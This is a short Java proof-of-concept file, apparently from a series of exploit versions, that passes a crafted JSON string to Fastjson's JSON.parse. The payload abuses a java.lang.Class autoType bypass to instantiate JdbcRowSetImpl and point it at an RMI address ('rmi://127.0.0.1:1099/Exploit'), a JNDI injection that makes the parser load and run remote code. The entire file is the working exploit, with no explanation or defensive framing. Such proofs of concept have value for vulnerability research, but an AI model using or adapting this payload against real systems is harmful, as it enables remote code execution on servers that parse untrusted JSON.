package 版本47;

import com.alibaba.fastjson.JSON;

public class poc {

public static void main(String[] argv) {
        String payload = "{\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}," +
        "\"xxxx\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":" +
        "\"rmi://127.0.0.1:1099/Exploit\",\"autoCommit\":true}}}";
        JSON.parse(payload);
        }

        }